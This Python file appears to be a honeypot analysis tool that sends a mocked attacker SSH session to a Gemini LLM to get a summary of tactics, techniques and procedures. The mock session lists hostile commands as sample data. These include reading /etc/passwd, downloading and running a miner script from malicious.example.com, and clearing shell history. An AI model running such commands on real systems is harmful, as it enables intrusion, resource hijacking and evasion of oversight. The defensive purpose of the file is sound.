"""
CloudSentinel AI Threat Reporter
Post-session analysis pipeline fetching data from Redis and generating TTP summaries via LLMs.
"""

import asyncio
import os
import json
from typing import Dict, Any

import httpx

async def mock_fetch_session_history(session_id: str) -> Dict[str, Any]:
    """
    Simulates fetching a complete SSH session history from Redis.
    In production, this would query a Redis Stream or database for the `session_id`.
    """
    print(f"[*] Fetching session data for {session_id} from Redis...")
    await asyncio.sleep(0.5)  # Simulate network latency
    return {
        "session_id": session_id,
        "attacker_ip": "198.51.100.45",
        "commands": [
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "wget http://malicious.example.com/miner.sh -O /tmp/miner.sh",
            "chmod +x /tmp/miner.sh",
            "/tmp/miner.sh &",
            "crontab -l",
            "history -c"
        ]
    }

async def analyze_threat_with_llm(session_data: Dict[str, Any]) -> str:
    """
    Sends session data to an LLM for TTP analysis.
    Defaults to the Google Gemini API structure as an example.
    """
    print("[*] Sending session logs to LLM for analysis...")
    api_key = os.getenv("GEMINI_API_KEY", "mock_key_for_testing")
    
    prompt = (
        "You are a Cyber Threat Intelligence Analyst. Review this attacker's terminal session log. "
        "Provide a highly concise, 3-bullet-point summary of their Tactics, Techniques, and Procedures (TTPs), "
        "and identify their likely primary objective. Do not include introductory text.\n\n"
        f"Attacker IP: {session_data['attacker_ip']}\n"
        f"Executed Commands:\n" + "\n".join(session_data['commands'])
    )

    # Using Gemini 1.5 Flash endpoint as the default
    endpoint = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api_key}"
    payload = {
        "contents": [{"parts": [{"text": prompt}]}]
    }

    # Fallback to local mock analysis if no real API key is configured
    if api_key == "mock_key_for_testing":
        await asyncio.sleep(1)
        return (
            "- Discovery: Executed `whoami` and `uname -a` to perform system and user enumeration.\n"
            "- Execution & Persistence: Downloaded an external payload `miner.sh`, made it executable, and ran it in the background.\n"
            "- Defense Evasion: Attempted to clear command traces using `history -c`.\n\n"
            "Likely Primary Objective: Resource Hijacking (Cryptocurrency Mining)."
        )

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(endpoint, json=payload, timeout=15.0)
            response.raise_for_status()
            data = response.json()
            return data["candidates"][0]["content"]["parts"][0]["text"]
        except Exception as e:
            return f"[!] Error communicating with LLM: {str(e)}"

async def send_webhook_alert(report: str) -> None:
    """
    Placeholder for sending the threat report to a Slack or Telegram webhook.
    """
    print("[*] Preparing to send webhook alert...")
    webhook_url = os.getenv("ALERT_WEBHOOK_URL")
    if not webhook_url:
        print("[-] No ALERT_WEBHOOK_URL configured. Skipping webhook dispatch.")
        return

    payload = {"text": f"🚨 *New Threat Intelligence Report*\n\n{report}"}
    
    # In production, dispatch the alert
    # async with httpx.AsyncClient() as client:
    #     try:
    #         await client.post(webhook_url, json=payload, timeout=5.0)
    #     except Exception as e:
    #         print(f"[!] Webhook delivery failed: {e}")
            
    print("[+] Webhook alert dispatched successfully (Simulated).")

async def main():
    """Main execution pipeline."""
    session_id = "session_9x8f7a6b5c4d"
    
    # 1. Fetch Data
    session_data = await mock_fetch_session_history(session_id)
    
    # 2. LLM Analysis
    threat_report = await analyze_threat_with_llm(session_data)
    
    # 3. Output / Alerting
    print("\n" + "="*50)
    print("🛡️  CLOUDSENTINEL AI THREAT REPORT  🛡️")
    print("="*50)
    print(threat_report)
    print("="*50 + "\n")
    
    # 4. Dispatch Alert (Slack/Telegram)
    await send_webhook_alert(threat_report)

if __name__ == "__main__":
    asyncio.run(main())
